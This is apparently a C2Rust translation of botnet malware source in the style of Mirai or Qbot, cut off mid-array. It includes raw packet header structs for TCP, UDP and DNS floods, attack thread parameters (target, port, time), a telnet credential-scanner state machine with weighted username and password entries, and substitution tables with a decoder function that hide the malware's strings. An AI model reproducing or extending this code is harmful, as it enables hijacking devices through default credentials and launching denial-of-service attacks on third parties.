#[repr(C)]
pub struct _IO_marker {
    pub _next: *mut _IO_marker,
    pub _sbuf: *mut _IO_FILE,
    pub _pos: libc::c_int,
}
pub type FILE = _IO_FILE;
pub type nfds_t = libc::c_ulong;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct pollfd {
    pub fd: libc::c_int,
    pub events: libc::c_short,
    pub revents: libc::c_short,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct sockaddr_un {
    pub sun_family: sa_family_t,
    pub sun_path: [libc::c_char; 108],
}
#[derive(Copy, Clone, BitfieldStruct)]
#[repr(C)]
pub struct iphdr {
    #[bitfield(name = "ihl", ty = "libc::c_uint", bits = "0..=3")]
    #[bitfield(name = "version", ty = "libc::c_uint", bits = "4..=7")]
    pub ihl_version: [u8; 1],
    pub tos: uint8_t,
    pub tot_len: uint16_t,
    pub id: uint16_t,
    pub frag_off: uint16_t,
    pub ttl: uint8_t,
    pub protocol: uint8_t,
    pub check: uint16_t,
    pub saddr: uint32_t,
    pub daddr: uint32_t,
}
#[derive(Copy, Clone, BitfieldStruct)]
#[repr(C)]
pub struct tcphdr {
    pub source: uint16_t,
    pub dest: uint16_t,
    pub seq: uint32_t,
    pub ack_seq: uint32_t,
    #[bitfield(name = "res1", ty = "uint16_t", bits = "0..=3")]
    #[bitfield(name = "doff", ty = "uint16_t", bits = "4..=7")]
    #[bitfield(name = "fin", ty = "uint16_t", bits = "8..=8")]
    #[bitfield(name = "syn", ty = "uint16_t", bits = "9..=9")]
    #[bitfield(name = "rst", ty = "uint16_t", bits = "10..=10")]
    #[bitfield(name = "psh", ty = "uint16_t", bits = "11..=11")]
    #[bitfield(name = "ack", ty = "uint16_t", bits = "12..=12")]
    #[bitfield(name = "urg", ty = "uint16_t", bits = "13..=13")]
    #[bitfield(name = "res2", ty = "uint16_t", bits = "14..=15")]
    pub res1_doff_fin_syn_rst_psh_ack_urg_res2: [u8; 2],
    pub window: uint16_t,
    pub check: uint16_t,
    pub urg_ptr: uint16_t,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct tcp_pseudo {
    pub src_addr: libc::c_ulong,
    pub dst_addr: libc::c_ulong,
    pub zero: libc::c_uchar,
    pub proto: libc::c_uchar,
    pub length: libc::c_ushort,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct thread_data {
    pub target: *mut libc::c_char,
    pub dport: libc::c_int,
    pub time: libc::c_int,
}
pub type iph = iphdr;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct udphdr {
    pub source: uint16_t,
    pub dest: uint16_t,
    pub len: uint16_t,
    pub check: uint16_t,
}
pub type udph = udphdr;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct ps_hdr {
    pub saddr: u_int32_t,
    pub daddr: u_int32_t,
    pub filler: u_int8_t,
    pub protocol: u_int8_t,
    pub len: u_int16_t,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct dns_hdr {
    pub id: libc::c_ushort,
    pub flags: libc::c_ushort,
    pub qcount: libc::c_ushort,
    pub ans: libc::c_ushort,
    pub auth: libc::c_ushort,
    pub add: libc::c_ushort,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct query {
    pub qtype: libc::c_ushort,
    pub qclass: libc::c_ushort,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct state_t {
    pub fd: libc::c_int,
    pub state: uint8_t,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct state_t_0 {
    pub fd: libc::c_int,
    pub state: uint8_t,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct state_t_1 {
    pub fd: libc::c_int,
    pub state: uint8_t,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct telstate_t {
    pub fd: libc::c_int,
    pub ip: libc::c_uint,
    pub port: libc::c_uint,
    pub state: libc::c_uchar,
    pub complete: libc::c_uchar,
    pub usernameInd: libc::c_uchar,
    pub passwordInd: libc::c_uchar,
    pub tempDirInd: libc::c_uchar,
    pub totalTimeout: libc::c_uint,
    pub bufUsed: libc::c_ushort,
    pub sockbuf: *mut libc::c_char,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct scanner_auth {
    pub username: *mut libc::c_char,
    pub password: *mut libc::c_char,
    pub weight_min: uint16_t,
    pub weight_max: uint16_t,
    pub username_len: uint8_t,
    pub password_len: uint8_t,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct scanner_connection {
    pub auth: *mut scanner_auth,
    pub fd: libc::c_int,
    pub last_recv: libc::c_int,
    pub state: C2RustUnnamed_2,
    pub dst_addr: uint32_t,
    pub dst_port: uint16_t,
    pub rdbuf_pos: libc::c_int,
    pub rdbuf: [libc::c_char; 256],
    pub tries: uint8_t,
}
pub type C2RustUnnamed_2 = libc::c_uint;
pub const SC_WAITING_TOKEN_RESP: C2RustUnnamed_2 = 10;
pub const SC_WAITING_SH_RESP: C2RustUnnamed_2 = 9;
pub const SC_WAITING_SHELL_RESP: C2RustUnnamed_2 = 8;
pub const SC_WAITING_SYSTEM_RESP: C2RustUnnamed_2 = 7;
pub const SC_WAITING_ENABLE_RESP: C2RustUnnamed_2 = 6;
pub const SC_WAITING_PASSWD_RESP: C2RustUnnamed_2 = 5;
pub const SC_WAITING_PASSWORD: C2RustUnnamed_2 = 4;
pub const SC_WAITING_USERNAME: C2RustUnnamed_2 = 3;
pub const SC_HANDLE_IACS: C2RustUnnamed_2 = 2;
pub const SC_CONNECTING: C2RustUnnamed_2 = 1;
pub const SC_CLOSED: C2RustUnnamed_2 = 0;
#[derive(Copy, Clone)]
#[repr(C)]
pub union C2RustUnnamed_3 {
    pub raw: uint32_t,
    pub octet: [uint8_t; 4],
}
#[no_mangle]
pub static mut hexarray: [libc::c_char; 256] = [
    0 as libc::c_int as libc::c_char,
    1 as libc::c_int as libc::c_char,
    2 as libc::c_int as libc::c_char,
    3 as libc::c_int as libc::c_char,
    4 as libc::c_int as libc::c_char,
    5 as libc::c_int as libc::c_char,
    6 as libc::c_int as libc::c_char,
    7 as libc::c_int as libc::c_char,
    8 as libc::c_int as libc::c_char,
    9 as libc::c_int as libc::c_char,
    10 as libc::c_int as libc::c_char,
    11 as libc::c_int as libc::c_char,
    12 as libc::c_int as libc::c_char,
    13 as libc::c_int as libc::c_char,
    14 as libc::c_int as libc::c_char,
    15 as libc::c_int as libc::c_char,
    16 as libc::c_int as libc::c_char,
    17 as libc::c_int as libc::c_char,
    18 as libc::c_int as libc::c_char,
    19 as libc::c_int as libc::c_char,
    20 as libc::c_int as libc::c_char,
    21 as libc::c_int as libc::c_char,
    22 as libc::c_int as libc::c_char,
    23 as libc::c_int as libc::c_char,
    24 as libc::c_int as libc::c_char,
    25 as libc::c_int as libc::c_char,
    26 as libc::c_int as libc::c_char,
    27 as libc::c_int as libc::c_char,
    28 as libc::c_int as libc::c_char,
    29 as libc::c_int as libc::c_char,
    30 as libc::c_int as libc::c_char,
    31 as libc::c_int as libc::c_char,
    32 as libc::c_int as libc::c_char,
    33 as libc::c_int as libc::c_char,
    34 as libc::c_int as libc::c_char,
    35 as libc::c_int as libc::c_char,
    36 as libc::c_int as libc::c_char,
    37 as libc::c_int as libc::c_char,
    38 as libc::c_int as libc::c_char,
    39 as libc::c_int as libc::c_char,
    40 as libc::c_int as libc::c_char,
    41 as libc::c_int as libc::c_char,
    42 as libc::c_int as libc::c_char,
    43 as libc::c_int as libc::c_char,
    44 as libc::c_int as libc::c_char,
    45 as libc::c_int as libc::c_char,
    46 as libc::c_int as libc::c_char,
    47 as libc::c_int as libc::c_char,
    48 as libc::c_int as libc::c_char,
    49 as libc::c_int as libc::c_char,
    50 as libc::c_int as libc::c_char,
    51 as libc::c_int as libc::c_char,
    52 as libc::c_int as libc::c_char,
    53 as libc::c_int as libc::c_char,
    54 as libc::c_int as libc::c_char,
    55 as libc::c_int as libc::c_char,
    56 as libc::c_int as libc::c_char,
    57 as libc::c_int as libc::c_char,
    58 as libc::c_int as libc::c_char,
    59 as libc::c_int as libc::c_char,
    60 as libc::c_int as libc::c_char,
    61 as libc::c_int as libc::c_char,
    62 as libc::c_int as libc::c_char,
    63 as libc::c_int as libc::c_char,
    64 as libc::c_int as libc::c_char,
    65 as libc::c_int as libc::c_char,
    66 as libc::c_int as libc::c_char,
    67 as libc::c_int as libc::c_char,
    68 as libc::c_int as libc::c_char,
    69 as libc::c_int as libc::c_char,
    70 as libc::c_int as libc::c_char,
    71 as libc::c_int as libc::c_char,
    72 as libc::c_int as libc::c_char,
    73 as libc::c_int as libc::c_char,
    74 as libc::c_int as libc::c_char,
    75 as libc::c_int as libc::c_char,
    76 as libc::c_int as libc::c_char,
    77 as libc::c_int as libc::c_char,
    78 as libc::c_int as libc::c_char,
    79 as libc::c_int as libc::c_char,
    80 as libc::c_int as libc::c_char,
    81 as libc::c_int as libc::c_char,
    82 as libc::c_int as libc::c_char,
    83 as libc::c_int as libc::c_char,
    84 as libc::c_int as libc::c_char,
    85 as libc::c_int as libc::c_char,
    86 as libc::c_int as libc::c_char,
    87 as libc::c_int as libc::c_char,
    88 as libc::c_int as libc::c_char,
    89 as libc::c_int as libc::c_char,
    90 as libc::c_int as libc::c_char,
    91 as libc::c_int as libc::c_char,
    92 as libc::c_int as libc::c_char,
    93 as libc::c_int as libc::c_char,
    94 as libc::c_int as libc::c_char,
    95 as libc::c_int as libc::c_char,
    96 as libc::c_int as libc::c_char,
    97 as libc::c_int as libc::c_char,
    98 as libc::c_int as libc::c_char,
    99 as libc::c_int as libc::c_char,
    100 as libc::c_int as libc::c_char,
    101 as libc::c_int as libc::c_char,
    102 as libc::c_int as libc::c_char,
    103 as libc::c_int as libc::c_char,
    104 as libc::c_int as libc::c_char,
    105 as libc::c_int as libc::c_char,
    106 as libc::c_int as libc::c_char,
    107 as libc::c_int as libc::c_char,
    108 as libc::c_int as libc::c_char,
    109 as libc::c_int as libc::c_char,
    110 as libc::c_int as libc::c_char,
    111 as libc::c_int as libc::c_char,
    112 as libc::c_int as libc::c_char,
    113 as libc::c_int as libc::c_char,
    114 as libc::c_int as libc::c_char,
    115 as libc::c_int as libc::c_char,
    116 as libc::c_int as libc::c_char,
    117 as libc::c_int as libc::c_char,
    118 as libc::c_int as libc::c_char,
    119 as libc::c_int as libc::c_char,
    120 as libc::c_int as libc::c_char,
    121 as libc::c_int as libc::c_char,
    122 as libc::c_int as libc::c_char,
    123 as libc::c_int as libc::c_char,
    124 as libc::c_int as libc::c_char,
    125 as libc::c_int as libc::c_char,
    126 as libc::c_int as libc::c_char,
    127 as libc::c_int as libc::c_char,
    128 as libc::c_int as libc::c_char,
    129 as libc::c_int as libc::c_char,
    130 as libc::c_int as libc::c_char,
    131 as libc::c_int as libc::c_char,
    132 as libc::c_int as libc::c_char,
    133 as libc::c_int as libc::c_char,
    134 as libc::c_int as libc::c_char,
    135 as libc::c_int as libc::c_char,
    136 as libc::c_int as libc::c_char,
    137 as libc::c_int as libc::c_char,
    138 as libc::c_int as libc::c_char,
    139 as libc::c_int as libc::c_char,
    140 as libc::c_int as libc::c_char,
    141 as libc::c_int as libc::c_char,
    142 as libc::c_int as libc::c_char,
    143 as libc::c_int as libc::c_char,
    144 as libc::c_int as libc::c_char,
    145 as libc::c_int as libc::c_char,
    146 as libc::c_int as libc::c_char,
    147 as libc::c_int as libc::c_char,
    148 as libc::c_int as libc::c_char,
    149 as libc::c_int as libc::c_char,
    150 as libc::c_int as libc::c_char,
    151 as libc::c_int as libc::c_char,
    152 as libc::c_int as libc::c_char,
    153 as libc::c_int as libc::c_char,
    154 as libc::c_int as libc::c_char,
    155 as libc::c_int as libc::c_char,
    156 as libc::c_int as libc::c_char,
    157 as libc::c_int as libc::c_char,
    158 as libc::c_int as libc::c_char,
    159 as libc::c_int as libc::c_char,
    160 as libc::c_int as libc::c_char,
    161 as libc::c_int as libc::c_char,
    162 as libc::c_int as libc::c_char,
    163 as libc::c_int as libc::c_char,
    164 as libc::c_int as libc::c_char,
    165 as libc::c_int as libc::c_char,
    166 as libc::c_int as libc::c_char,
    167 as libc::c_int as libc::c_char,
    168 as libc::c_int as libc::c_char,
    169 as libc::c_int as libc::c_char,
    170 as libc::c_int as libc::c_char,
    171 as libc::c_int as libc::c_char,
    172 as libc::c_int as libc::c_char,
    173 as libc::c_int as libc::c_char,
    174 as libc::c_int as libc::c_char,
    175 as libc::c_int as libc::c_char,
    176 as libc::c_int as libc::c_char,
    177 as libc::c_int as libc::c_char,
    178 as libc::c_int as libc::c_char,
    179 as libc::c_int as libc::c_char,
    180 as libc::c_int as libc::c_char,
    181 as libc::c_int as libc::c_char,
    182 as libc::c_int as libc::c_char,
    183 as libc::c_int as libc::c_char,
    184 as libc::c_int as libc::c_char,
    185 as libc::c_int as libc::c_char,
    186 as libc::c_int as libc::c_char,
    187 as libc::c_int as libc::c_char,
    188 as libc::c_int as libc::c_char,
    189 as libc::c_int as libc::c_char,
    190 as libc::c_int as libc::c_char,
    191 as libc::c_int as libc::c_char,
    192 as libc::c_int as libc::c_char,
    193 as libc::c_int as libc::c_char,
    194 as libc::c_int as libc::c_char,
    195 as libc::c_int as libc::c_char,
    196 as libc::c_int as libc::c_char,
    197 as libc::c_int as libc::c_char,
    198 as libc::c_int as libc::c_char,
    199 as libc::c_int as libc::c_char,
    200 as libc::c_int as libc::c_char,
    201 as libc::c_int as libc::c_char,
    202 as libc::c_int as libc::c_char,
    203 as libc::c_int as libc::c_char,
    204 as libc::c_int as libc::c_char,
    205 as libc::c_int as libc::c_char,
    206 as libc::c_int as libc::c_char,
    207 as libc::c_int as libc::c_char,
    208 as libc::c_int as libc::c_char,
    209 as libc::c_int as libc::c_char,
    210 as libc::c_int as libc::c_char,
    211 as libc::c_int as libc::c_char,
    212 as libc::c_int as libc::c_char,
    213 as libc::c_int as libc::c_char,
    214 as libc::c_int as libc::c_char,
    215 as libc::c_int as libc::c_char,
    216 as libc::c_int as libc::c_char,
    217 as libc::c_int as libc::c_char,
    218 as libc::c_int as libc::c_char,
    219 as libc::c_int as libc::c_char,
    220 as libc::c_int as libc::c_char,
    221 as libc::c_int as libc::c_char,
    222 as libc::c_int as libc::c_char,
    223 as libc::c_int as libc::c_char,
    224 as libc::c_int as libc::c_char,
    225 as libc::c_int as libc::c_char,
    226 as libc::c_int as libc::c_char,
    227 as libc::c_int as libc::c_char,
    228 as libc::c_int as libc::c_char,
    229 as libc::c_int as libc::c_char,
    230 as libc::c_int as libc::c_char,
    231 as libc::c_int as libc::c_char,
    232 as libc::c_int as libc::c_char,
    233 as libc::c_int as libc::c_char,
    234 as libc::c_int as libc::c_char,
    235 as libc::c_int as libc::c_char,
    236 as libc::c_int as libc::c_char,
    237 as libc::c_int as libc::c_char,
    238 as libc::c_int as libc::c_char,
    239 as libc::c_int as libc::c_char,
    240 as libc::c_int as libc::c_char,
    241 as libc::c_int as libc::c_char,
    242 as libc::c_int as libc::c_char,
    243 as libc::c_int as libc::c_char,
    244 as libc::c_int as libc::c_char,
    245 as libc::c_int as libc::c_char,
    246 as libc::c_int as libc::c_char,
    247 as libc::c_int as libc::c_char,
    248 as libc::c_int as libc::c_char,
    249 as libc::c_int as libc::c_char,
    250 as libc::c_int as libc::c_char,
    251 as libc::c_int as libc::c_char,
    252 as libc::c_int as libc::c_char,
    253 as libc::c_int as libc::c_char,
    254 as libc::c_int as libc::c_char,
    255 as libc::c_int as libc::c_char,
];
#[no_mangle]
pub static mut hexarray2: [libc::c_char; 256] = [
    123 as libc::c_int as libc::c_char,
    78 as libc::c_int as libc::c_char,
    96 as libc::c_int as libc::c_char,
    110 as libc::c_int as libc::c_char,
    183 as libc::c_int as libc::c_char,
    190 as libc::c_int as libc::c_char,
    234 as libc::c_int as libc::c_char,
    18 as libc::c_int as libc::c_char,
    171 as libc::c_int as libc::c_char,
    91 as libc::c_int as libc::c_char,
    31 as libc::c_int as libc::c_char,
    44 as libc::c_int as libc::c_char,
    7 as libc::c_int as libc::c_char,
    239 as libc::c_int as libc::c_char,
    173 as libc::c_int as libc::c_char,
    172 as libc::c_int as libc::c_char,
    159 as libc::c_int as libc::c_char,
    222 as libc::c_int as libc::c_char,
    67 as libc::c_int as libc::c_char,
    114 as libc::c_int as libc::c_char,
    230 as libc::c_int as libc::c_char,
    199 as libc::c_int as libc::c_char,
    23 as libc::c_int as libc::c_char,
    105 as libc::c_int as libc::c_char,
    146 as libc::c_int as libc::c_char,
    129 as libc::c_int as libc::c_char,
    135 as libc::c_int as libc::c_char,
    84 as libc::c_int as libc::c_char,
    200 as libc::c_int as libc::c_char,
    175 as libc::c_int as libc::c_char,
    77 as libc::c_int as libc::c_char,
    253 as libc::c_int as libc::c_char,
    52 as libc::c_int as libc::c_char,
    156 as libc::c_int as libc::c_char,
    55 as libc::c_int as libc::c_char,
    243 as libc::c_int as libc::c_char,
    165 as libc::c_int as libc::c_char,
    130 as libc::c_int as libc::c_char,
    169 as libc::c_int as libc::c_char,
    86 as libc::c_int as libc::c_char,
    27 as libc::c_int as libc::c_char,
    211 as libc::c_int as libc::c_char,
    178 as libc::c_int as libc::c_char,
    233 as libc::c_int as libc::c_char,
    236 as libc::c_int as libc::c_char,
    220 as libc::c_int as libc::c_char,
    151 as libc::c_int as libc::c_char,
    39 as libc::c_int as libc::c_char,
    80 as libc::c_int as libc::c_char,
    235 as libc::c_int as libc::c_char,
    134 as libc::c_int as libc::c_char,
    226 as libc::c_int as libc::c_char,
    111 as libc::c_int as libc::c_char,
    207 as libc::c_int as libc::c_char,
    42 as libc::c_int as libc::c_char,
    71 as libc::c_int as libc::c_char,
    154 as libc::c_int as libc::c_char,
    208 as libc::c_int as libc::c_char,
    241 as libc::c_int as libc::c_char,
    66 as libc::c_int as libc::c_char,
    127 as libc::c_int as libc::c_char,
    223 as libc::c_int as libc::c_char,
    219 as libc::c_int as libc::c_char,
    103 as libc::c_int as libc::c_char,
    126 as libc::c_int as libc::c_char,
    164 as libc::c_int as libc::c_char,
    53 as libc::c_int as libc::c_char,
    218 as libc::c_int as libc::c_char,
    205 as libc::c_int as libc::c_char,
    157 as libc::c_int as libc::c_char,
    20 as libc::c_int as libc::c_char,
    215 as libc::c_int as libc::c_char,
    195 as libc::c_int as libc::c_char,
    104 as libc::c_int as libc::c_char,
    179 as libc::c_int as libc::c_char,
    76 as libc::c_int as libc::c_char,
    92 as libc::c_int as libc::c_char,
    98 as libc::c_int as libc::c_char,
    217 as libc::c_int as libc::c_char,
    9 as libc::c_int as libc::c_char,
    30 as libc::c_int as libc::c_char,
    115 as libc::c_int as libc::c_char,
    54 as libc::c_int as libc::c_char,
    70 as libc::c_int as libc::c_char,
    176 as libc::c_int as libc::c_char,
    188 as libc::c_int as libc::c_char,
    28 as libc::c_int as libc::c_char,
    119 as libc::c_int as libc::c_char,
    94 as libc::c_int as libc::c_char,
    128 as libc::c_int as libc::c_char,
    35 as libc::c_int as libc::c_char,
    168 as libc::c_int as libc::c_char,
    155 as libc::c_int as libc::c_char,
    8 as libc::c_int as libc::c_char,
    174 as libc::c_int as libc::c_char,
    180 as libc::c_int as libc::c_char,
    221 as libc::c_int as libc::c_char,
    144 as libc::c_int as libc::c_char,
    210 as libc::c_int as libc::c_char,
    206 as libc::c_int as libc::c_char,
    97 as libc::c_int as libc::c_char,
    81 as libc::c_int as libc::c_char,
    117 as libc::c_int as libc::c_char,
    249 as libc::c_int as libc::c_char,
    101 as libc::c_int as libc::c_char,
    25 as libc::c_int as libc::c_char,
    240 as libc::c_int as libc::c_char,
    120 as libc::c_int as libc::c_char,
    60 as libc::c_int as libc::c_char,
    212 as libc::c_int as libc::c_char,
    255 as libc::c_int as libc::c_char,
    185 as libc::c_int as libc::c_char,
    160 as libc::c_int as libc::c_char,
    203 as libc::c_int as libc::c_char,
    231 as libc::c_int as libc::c_char,
    3 as libc::c_int as libc::c_char,
    57 as libc::c_int as libc::c_char,
    228 as libc::c_int as libc::c_char,
    252 as libc::c_int as libc::c_char,
    90 as libc::c_int as libc::c_char,
    193 as libc::c_int as libc::c_char,
    34 as libc::c_int as libc::c_char,
    62 as libc::c_int as libc::c_char,
    237 as libc::c_int as libc::c_char,
    145 as libc::c_int as libc::c_char,
    216 as libc::c_int as libc::c_char,
    12 as libc::c_int as libc::c_char,
    5 as libc::c_int as libc::c_char,
    64 as libc::c_int as libc::c_char,
    201 as libc::c_int as libc::c_char,
    79 as libc::c_int as libc::c_char,
    65 as libc::c_int as libc::c_char,
    109 as libc::c_int as libc::c_char,
    133 as libc::c_int as libc::c_char,
    51 as libc::c_int as libc::c_char,
    83 as libc::c_int as libc::c_char,
    132 as libc::c_int as libc::c_char,
    17 as libc::c_int as libc::c_char,
    254 as libc::c_int as libc::c_char,
    6 as libc::c_int as libc::c_char,
    152 as libc::c_int as libc::c_char,
    58 as libc::c_int as libc::c_char,
    106 as libc::c_int as libc::c_char,
    26 as libc::c_int as libc::c_char,
    85 as libc::c_int as libc::c_char,
    224 as libc::c_int as libc::c_char,
    247 as libc::c_int as libc::c_char,
    143 as libc::c_int as libc::c_char,
    40 as libc::c_int as libc::c_char,
    63 as libc::c_int as libc::c_char,
    194 as libc::c_int as libc::c_char,
    59 as libc::c_int as libc::c_char,
    137 as libc::c_int as libc::c_char,
    196 as libc::c_int as libc::c_char,
    56 as libc::c_int as libc::c_char,
    11 as libc::c_int as libc::c_char,
    250 as libc::c_int as libc::c_char,
    166 as libc::c_int as libc::c_char,
    191 as libc::c_int as libc::c_char,
    131 as libc::c_int as libc::c_char,
    16 as libc::c_int as libc::c_char,
    167 as libc::c_int as libc::c_char,
    2 as libc::c_int as libc::c_char,
    99 as libc::c_int as libc::c_char,
    242 as libc::c_int as libc::c_char,
    38 as libc::c_int as libc::c_char,
    192 as libc::c_int as libc::c_char,
    150 as libc::c_int as libc::c_char,
    19 as libc::c_int as libc::c_char,
    89 as libc::c_int as libc::c_char,
    61 as libc::c_int as libc::c_char,
    68 as libc::c_int as libc::c_char,
    139 as libc::c_int as libc::c_char,
    46 as libc::c_int as libc::c_char,
    140 as libc::c_int as libc::c_char,
    93 as libc::c_int as libc::c_char,
    162 as libc::c_int as libc::c_char,
    147 as libc::c_int as libc::c_char,
    138 as libc::c_int as libc::c_char,
    14 as libc::c_int as libc::c_char,
    95 as libc::c_int as libc::c_char,
    225 as libc::c_int as libc::c_char,
    74 as libc::c_int as libc::c_char,
    73 as libc::c_int as libc::c_char,
    229 as libc::c_int as libc::c_char,
    251 as libc::c_int as libc::c_char,
    209 as libc::c_int as libc::c_char,
    4 as libc::c_int as libc::c_char,
    69 as libc::c_int as libc::c_char,
    248 as libc::c_int as libc::c_char,
    48 as libc::c_int as libc::c_char,
    37 as libc::c_int as libc::c_char,
    198 as libc::c_int as libc::c_char,
    24 as libc::c_int as libc::c_char,
    189 as libc::c_int as libc::c_char,
    204 as libc::c_int as libc::c_char,
    32 as libc::c_int as libc::c_char,
    88 as libc::c_int as libc::c_char,
    122 as libc::c_int as libc::c_char,
    232 as libc::c_int as libc::c_char,
    21 as libc::c_int as libc::c_char,
    75 as libc::c_int as libc::c_char,
    148 as libc::c_int as libc::c_char,
    136 as libc::c_int as libc::c_char,
    213 as libc::c_int as libc::c_char,
    186 as libc::c_int as libc::c_char,
    22 as libc::c_int as libc::c_char,
    113 as libc::c_int as libc::c_char,
    142 as libc::c_int as libc::c_char,
    245 as libc::c_int as libc::c_char,
    13 as libc::c_int as libc::c_char,
    187 as libc::c_int as libc::c_char,
    161 as libc::c_int as libc::c_char,
    108 as libc::c_int as libc::c_char,
    41 as libc::c_int as libc::c_char,
    47 as libc::c_int as libc::c_char,
    15 as libc::c_int as libc::c_char,
    141 as libc::c_int as libc::c_char,
    124 as libc::c_int as libc::c_char,
    118 as libc::c_int as libc::c_char,
    184 as libc::c_int as libc::c_char,
    238 as libc::c_int as libc::c_char,
    197 as libc::c_int as libc::c_char,
    1 as libc::c_int as libc::c_char,
    181 as libc::c_int as libc::c_char,
    49 as libc::c_int as libc::c_char,
    149 as libc::c_int as libc::c_char,
    29 as libc::c_int as libc::c_char,
    107 as libc::c_int as libc::c_char,
    227 as libc::c_int as libc::c_char,
    153 as libc::c_int as libc::c_char,
    244 as libc::c_int as libc::c_char,
    163 as libc::c_int as libc::c_char,
    43 as libc::c_int as libc::c_char,
    125 as libc::c_int as libc::c_char,
    158 as libc::c_int as libc::c_char,
    87 as libc::c_int as libc::c_char,
    100 as libc::c_int as libc::c_char,
    112 as libc::c_int as libc::c_char,
    72 as libc::c_int as libc::c_char,
    170 as libc::c_int as libc::c_char,
    202 as libc::c_int as libc::c_char,
    45 as libc::c_int as libc::c_char,
    214 as libc::c_int as libc::c_char,
    182 as libc::c_int as libc::c_char,
    36 as libc::c_int as libc::c_char,
    10 as libc::c_int as libc::c_char,
    246 as libc::c_int as libc::c_char,
    82 as libc::c_int as libc::c_char,
    121 as libc::c_int as libc::c_char,
    102 as libc::c_int as libc::c_char,
    33 as libc::c_int as libc::c_char,
    50 as libc::c_int as libc::c_char,
    177 as libc::c_int as libc::c_char,
    0 as libc::c_int as libc::c_char,
    116 as libc::c_int as libc::c_char,
];
#[no_mangle]
pub static mut decoded: [libc::c_char; 256] = [0; 256];
#[no_mangle]
pub static mut decodedshit: *mut *mut libc::c_char = 0 as *const *mut libc::c_char
    as *mut *mut libc::c_char;
#[no_mangle]
pub static mut numdecodes: libc::c_int = 1 as libc::c_int;
#[no_mangle]
pub unsafe extern "C" fn eika(mut str: *mut libc::c_char) -> *mut libc::c_char {
    if strcmp(str, b"\0" as *const u8 as *const libc::c_char) == 0 as libc::c_int {
        return str;
    }
    let mut decodedshit2: *mut *mut libc::c_char = 0 as *mut *mut libc::c_char;
    let mut x_0: libc::c_int = 0 as libc::c_int;
    let mut i_0: libc::c_int = 0 as libc::c_int;
    let mut c_0: libc::c_int = 0;
    if numdecodes as libc::c_ulong
        > (::std::mem::size_of::<*mut *mut libc::c_char>() as libc::c_ulong)
            .wrapping_div(
                (::std::mem::size_of::<libc::c_char>() as libc::c_ulong)
                    .wrapping_mul(256 as libc::c_int as libc::c_ulong),
            )
    {
        numdecodes = 1 as libc::c_int;
    }
    decodedshit2 = malloc(
        ::std::mem::size_of::<*mut *mut libc::c_char>() as libc::c_ulong,
    ) as *mut *mut libc::c_char;
    i_0 = 0 as libc::c_int;
    while i_0 < numdecodes - 1 as libc::c_int {
        let ref mut fresh0 = *decodedshit2.offset(i_0 as isize);
        *fresh0 = *decodedshit.offset(i_0 as isize);
        i_0 += 1;
    }
    memset(
        decoded.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        ::std::mem::size_of::<[libc::c_char; 256]>() as libc::c_ulong,
    );
    while (x_0 as libc::c_ulong) < strlen(str) {
        c_0 = 0 as libc::c_int;
        while (c_0 as libc::c_ulong)
            < (::std::mem::size_of::<[libc::c_char; 256]>() as libc::c_ulong)
                .wrapping_add(1 as libc::c_int as libc::c_ulong)
        {
            if *str.offset(x_0 as isize) as libc::c_int
                == hexarray2[c_0 as usize] as libc::c_int
            {
                decoded[i_0 as usize] = hexarray[c_0 as usize];
                i_0 += 1;
            }
            c_0 += 1;
        }
        x_0 += 1;
    }
    let ref mut fresh1 = *decodedshit2.offset((numdecodes - 1 as libc::c_int) as isize);
    *fresh1 = decoded.as_mut_ptr();
    free(decodedshit as *mut libc::c_void);
    decodedshit = decodedshit2;
    return *decodedshit.offset((numdecodes - 1 as libc::c_int) as isize);
}
#[no_mangle]
pub static mut encodes: [libc::c_char; 64] = [
    '%' as i32 as libc::c_char,
    'q' as i32 as libc::c_char,
    '*' as i32 as libc::c_char,
    'K' as i32 as libc::c_char,
    'C' as i32 as libc::c_char,
    ')' as i32 as libc::c_char,
    '&' as i32 as libc::c_char,
    'F' as i32 as libc::c_char,
    '9' as i32 as libc::c_char,
    '8' as i32 as libc::c_char,
    'f' as i32 as libc::c_char,
    's' as i32 as libc::c_char,
    'r' as i32 as libc::c_char,
    '2' as i32 as libc::c_char,
    't' as i32 as libc::c_char,
    'o' as i32 as libc::c_char,
    '4' as i32 as libc::c_char,
    'b' as i32 as libc::c_char,
    '3' as i32 as libc::c_char,
    'y' as i32 as libc::c_char,
    'i' as i32 as libc::c_char,
    '_' as i32 as libc::c_char,
    ':' as i32 as libc::c_char,
    'w' as i32 as libc::c_char,
    'B' as i32 as libc::c_char,
    '>' as i32 as libc::c_char,
    'z' as i32 as libc::c_char,
    '=' as i32 as libc::c_char,
    ';' as i32 as libc::c_char,
    '!' as i32 as libc::c_char,
    'k' as i32 as libc::c_char,
    '?' as i32 as libc::c_char,
    '"' as i32 as libc::c_char,
    'E' as i32 as libc::c_char,
    'A' as i32 as libc::c_char,
    'Z' as i32 as libc::c_char,
    '7' as i32 as libc::c_char,
    '.' as i32 as libc::c_char,
    'D' as i32 as libc::c_char,
    '-' as i32 as libc::c_char,
    'm' as i32 as libc::c_char,
    'd' as i32 as libc::c_char,
    '<' as i32 as libc::c_char,
    'e' as i32 as libc::c_char,
    'x' as i32 as libc::c_char,
    '5' as i32 as libc::c_char,
    'U' as i32 as libc::c_char,
    '~' as i32 as libc::c_char,
    'h' as i32 as libc::c_char,
    ',' as i32 as libc::c_char,
    'j' as i32 as libc::c_char,
    '|' as i32 as libc::c_char,
    '$' as i32 as libc::c_char,
    'v' as i32 as libc::c_char,
    '6' as i32 as libc::c_char,
    'c' as i32 as libc::c_char,
    '1' as i32 as libc::c_char,
    'g' as i32 as libc::c_char,
    'a' as i32 as libc::c_char,
    '+' as i32 as libc::c_char,
    'p' as i32 as libc::c_char,
    '@' as i32 as libc::c_char,
    'u' as i32 as libc::c_char,
    'n' as i32 as libc::c_char,
];
#[no_mangle]
pub static mut decodes: [libc::c_char; 64] = [
    '0' as i32 as libc::c_char,
